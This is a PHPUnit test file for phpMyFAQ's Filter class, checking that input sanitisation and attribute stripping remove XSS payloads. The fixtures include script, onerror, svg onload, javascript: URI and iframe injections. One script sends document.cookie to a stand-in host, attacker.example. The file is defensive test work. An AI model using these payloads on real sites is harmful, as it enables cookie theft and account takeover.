<?php

namespace phpMyFAQ;

use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\TestCase;

#[AllowMockObjectsWithoutExpectations]
class FilterTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
    }

    public function testFilterInputWithValidInput(): void
    {
        $_GET['test_var'] = 'test_value';

        $result = Filter::filterInput(INPUT_GET, 'test_var', FILTER_SANITIZE_SPECIAL_CHARS, 'default');
        $this->assertIsString($result);
    }

    public function testFilterInputWithDefaultValue(): void
    {
        $result = Filter::filterInput(INPUT_GET, 'non_existent', FILTER_SANITIZE_SPECIAL_CHARS, 'default_value');
        $this->assertEquals('default_value', $result);
    }

    public function testFilterInputWithSpecialChars(): void
    {
        $_GET['special_test'] = '<script>alert("xss")</script>';

        $result = Filter::filterInput(INPUT_GET, 'special_test', FILTER_SANITIZE_SPECIAL_CHARS);

        if ($result === null) {
            $resultWithDefault = Filter::filterInput(
                INPUT_GET,
                'special_test',
                FILTER_SANITIZE_SPECIAL_CHARS,
                'safe_default',
            );
            $this->assertEquals('safe_default', $resultWithDefault);
        } else {
            $this->assertIsString($result);
            $this->assertStringNotContainsString('<script>', $result);
            $this->assertStringNotContainsString('alert', $result);
        }
    }

    public function testFilterVar(): void
    {
        $email = 'test@example.com';
        $result = Filter::filterVar($email, FILTER_VALIDATE_EMAIL);
        $this->assertEquals($email, $result);

        $invalidEmail = 'invalid-email';
        $result = Filter::filterVar($invalidEmail, FILTER_VALIDATE_EMAIL, 'default@example.com');
        $this->assertEquals('default@example.com', $result);
    }

    public function testFilterVarWithSpecialChars(): void
    {
        $input = '<script>alert("test")</script>';
        $result = Filter::filterVar($input, FILTER_SANITIZE_SPECIAL_CHARS);

        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringContainsString('alert', $result);
    }

    public function testFilterEmailWithValidEmail(): void
    {
        $result = Filter::filterEmail('test@example.com');

        $this->assertSame('test@example.com', $result);
    }

    public function testFilterEmailWithInvalidEmailReturnsDefault(): void
    {
        $result = Filter::filterEmail('invalid-email', 'fallback@example.com');

        $this->assertSame('fallback@example.com', $result);
    }

    public function testFilterEmailWithInvalidEmailWithoutDefaultReturnsNull(): void
    {
        $result = Filter::filterEmail('invalid-email');

        $this->assertNull($result);
    }

    public function testFilterArray(): void
    {
        $testArray = [
            'name' => 'John Doe',
            'email' => 'john@example.com',
            'age' => '25',
        ];

        $result = Filter::filterArray($testArray, FILTER_SANITIZE_SPECIAL_CHARS);
        $this->assertEquals('John Doe', $result['name']);
        $this->assertEquals('john@example.com', $result['email']);
        $this->assertEquals('25', $result['age']);
    }

    public function testFilterArrayWithMaliciousInput(): void
    {
        $testArray = [
            'name' => '<script>alert("xss")</script>John',
            'comment' => 'Good product<script>steal()</script>',
        ];

        $result = Filter::filterArray($testArray, FILTER_SANITIZE_SPECIAL_CHARS);
        $this->assertStringNotContainsString('<script>', $result['name']);
        $this->assertStringNotContainsString('<script>', $result['comment']);
    }

    public function testGetFilteredQueryString(): void
    {
        $_SERVER['QUERY_STRING'] = 'name=John&age=25&city=Berlin';

        $result = Filter::getFilteredQueryString();
        $this->assertIsString($result);
        $this->assertStringContainsString('name=John', $result);
        $this->assertStringContainsString('age=25', $result);
        $this->assertStringContainsString('city=Berlin', $result);
    }

    public function testGetFilteredQueryStringWithMaliciousInput(): void
    {
        $_SERVER['QUERY_STRING'] = 'name=<script>alert("xss")</script>&comment=<img src=x>';

        $result = Filter::getFilteredQueryString();
        $this->assertIsString($result);
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('<img', $result);
    }

    public function testGetFilteredQueryStringReturnsEmptyStringWhenQueryStringIsMissing(): void
    {
        unset($_SERVER['QUERY_STRING']);

        $result = Filter::getFilteredQueryString();

        $this->assertSame('', $result);
    }

    public function testGetFilteredQueryStringSanitizesArrayValues(): void
    {
        $_SERVER['QUERY_STRING'] = 'tags[0]=<b>first</b>&tags[1]=<script>second</script>&plain=<i>value</i>';

        $result = Filter::getFilteredQueryString();

        parse_str($result, $parsedResult);

        $this->assertSame(
            [
                'plain' => 'value',
                'tags' => ['first', 'second'],
            ],
            $parsedResult,
        );
    }

    public function testGetFilteredQueryStringSanitizesNestedArrayValues(): void
    {
        $_SERVER['QUERY_STRING'] = 'a[b][c]=<script>xss</script>&a[b][d]=safe';

        $result = Filter::getFilteredQueryString();
        parse_str($result, $parsedResult);

        $this->assertSame('xss', $parsedResult['a']['b']['c']);
        $this->assertSame('safe', $parsedResult['a']['b']['d']);
    }

    public function testFilterSanitizeString(): void
    {
        $filter = new Filter();

        $input = '<script>alert("test")</script>Hello World';
        $result = $filter->filterSanitizeString($input);

        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringContainsString('Hello World', $result);
    }

    public function testFilterSanitizeStringWithQuotes(): void
    {
        $filter = new Filter();

        $input = 'Hello "World" and \'Test\'';
        $result = $filter->filterSanitizeString($input);

        $this->assertStringContainsString('&quot;', $result);
        $this->assertStringContainsString('&apos;', $result);
        $this->assertStringNotContainsString('"', $result);
        $this->assertStringNotContainsString("'", $result);
    }

    public function testFilterSanitizeStringWithNullBytes(): void
    {
        $filter = new Filter();

        $input = "Hello\x00World";
        $result = $filter->filterSanitizeString($input);

        $this->assertStringNotContainsString("\x00", $result);
        $this->assertStringContainsString('HelloWorld', $result);
    }

    public function testRemoveAttributes(): void
    {
        $html = '<div class="test" onclick="alert(\'xss\')" style="color: red;">Content</div>';
        $result = Filter::removeAttributes($html);

        $this->assertStringContainsString('class="test"', $result);
        $this->assertStringNotContainsString('style', $result);
        $this->assertStringNotContainsString('onclick', $result);
    }

    public function testRemoveAttributesKeepsAllowedAttributes(): void
    {
        $html = '<a href="http://example.com" title="Test">Link</a>';
        $result = Filter::removeAttributes($html);

        $this->assertStringContainsString('href=', $result);
        $this->assertStringContainsString('title=', $result);

        $imgHtml = '<img src="image.jpg" alt="Test" width="100" height="200">';
        $imgResult = Filter::removeAttributes($imgHtml);
        $this->assertStringContainsString('src=', $imgResult);
        $this->assertStringContainsString('alt=', $imgResult);
        $this->assertStringContainsString('width=', $imgResult);
        $this->assertStringContainsString('height=', $imgResult);
    }

    public function testRemoveAttributesRemovesDangerousAttributes(): void
    {
        $dangerousHtml = '<div onclick="alert(\'xss\')" onmouseover="steal()">Content</div>';
        $result = Filter::removeAttributes($dangerousHtml);

        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('onmouseover', $result);
        $this->assertStringContainsString('Content', $result);
    }

    public function testRemoveAttributesWithBrokenStuff(): void
    {
        $html = 'Content with&#13;broken stuff';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('&#13;', $result);
        $this->assertStringContainsString('Content withbroken stuff', $result);
    }

    public function testFilterInputArrayMethod(): void
    {
        $_POST['name'] = 'John Doe';
        $_POST['email'] = 'john@example.com';

        $definition = [
            'name' => FILTER_FLAG_NO_ENCODE_QUOTES,
            'email' => FILTER_VALIDATE_EMAIL,
        ];

        $result = Filter::filterInputArray(INPUT_POST, $definition);

        $this->assertThat($result, $this->logicalOr($this->isArray(), $this->isBool(), $this->isNull()));
    }

    public function testFilterWithDifferentTypes(): void
    {
        $result = Filter::filterVar('123', FILTER_VALIDATE_INT);
        $this->assertEquals(123, $result);

        $result = Filter::filterVar('not_a_number', FILTER_VALIDATE_INT, 0);
        $this->assertEquals(0, $result);

        $result = Filter::filterVar('https://example.com', FILTER_VALIDATE_URL);
        $this->assertEquals('https://example.com', $result);

        $result = Filter::filterVar('not_a_url', FILTER_VALIDATE_URL, 'https://default.com');
        $this->assertEquals('https://default.com', $result);
    }

    public function testComplexHtmlFiltering(): void
    {
        $complexHtml = '
            <div class="container" onclick="malicious()">
                <p style="color: red;" onmouseover="bad()">
                    <a href="http://example.com" target="_blank" onclick="evil()">Link</a>
                </p>
                <img src="image.jpg" alt="Test" onclick="hack()" width="100">
            </div>
        ';

        $result = Filter::removeAttributes($complexHtml);

        $this->assertStringContainsString('class="container"', $result);
        $this->assertStringNotContainsString('style', $result);
        $this->assertStringContainsString('href="http://example.com"', $result);
        $this->assertStringContainsString('target="_blank"', $result);
        $this->assertStringContainsString('src="image.jpg"', $result);
        $this->assertStringContainsString('alt="Test"', $result);
        $this->assertStringContainsString('width="100"', $result);

        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('onmouseover', $result);
    }

    public function testRemoveAttributesWithUnquotedValues(): void
    {
        $html = '<img src=x onerror=alert(1)>';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('onerror', $result);
    }

    public function testRemoveAttributesWithSingleQuotedValues(): void
    {
        $html = "<img src='x' onerror='alert(1)'>";
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('onerror', $result);
    }

    public function testRemoveAttributesWithSvgOnload(): void
    {
        $html = '<svg onload=alert(1)>';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('<svg', $result);
    }

    public function testRemoveAttributesStripsScriptTags(): void
    {
        $html = 'Safe content<script>alert(document.cookie)</script> more content';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringNotContainsString('alert(document.cookie)', $result);
        $this->assertStringContainsString('Safe content', $result);
        $this->assertStringContainsString('more content', $result);
    }

    public function testRemoveAttributesStripsIframeTags(): void
    {
        $html = 'Before<iframe src="https://evil.com"></iframe>After';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('<iframe', $result);
        $this->assertStringNotContainsString('</iframe>', $result);
        $this->assertStringContainsString('Before', $result);
        $this->assertStringContainsString('After', $result);
    }

    public function testRemoveAttributesStripsObjectEmbedTags(): void
    {
        $html = '<object data="evil.swf"><embed src="evil.swf"></object>';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('<object', $result);
        $this->assertStringNotContainsString('<embed', $result);
    }

    public function testRemoveAttributesStripsJavascriptUri(): void
    {
        $html = '<a href="javascript:alert(1)">click</a>';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringContainsString('click', $result);
    }

    public function testRemoveAttributesStripsFormAndBaseTags(): void
    {
        $html = '<form action="https://evil.com"><input name="q"><base href="https://evil.com">';
        $result = Filter::removeAttributes($html);

        $this->assertStringNotContainsString('<form', $result);
        $this->assertStringNotContainsString('<base', $result);
    }

    public function testRemoveAttributesHandlesEncodeThenDecode(): void
    {
        // Simulates the actual pipeline: FILTER_SANITIZE_SPECIAL_CHARS -> html_entity_decode -> removeAttributes
        $userInput = 'Helpful content<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>';
        $filtered = Filter::filterVar($userInput, FILTER_SANITIZE_SPECIAL_CHARS);
        $decoded = html_entity_decode((string) $filtered, ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $result = Filter::removeAttributes($decoded);

        // Script tags are stripped by filterSanitizeString, so the content is safe plain text
        $this->assertStringNotContainsString('<script>', $result);
        $this->assertStringContainsString('Helpful content', $result);
    }

    public function testRemoveAttributesWithMixedQuoteStyles(): void
    {
        $html = '<div class="safe" onclick=alert(1) style=\'color:red\' onmouseover="steal()">';
        $result = Filter::removeAttributes($html);

        $this->assertStringContainsString('class="safe"', $result);
        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('onmouseover', $result);
    }

    protected function tearDown(): void
    {
        unset($_GET['test_var'], $_GET['special_test'], $_POST['name'], $_POST['email']);
        unset($_SERVER['QUERY_STRING']);
        parent::tearDown();
    }
}
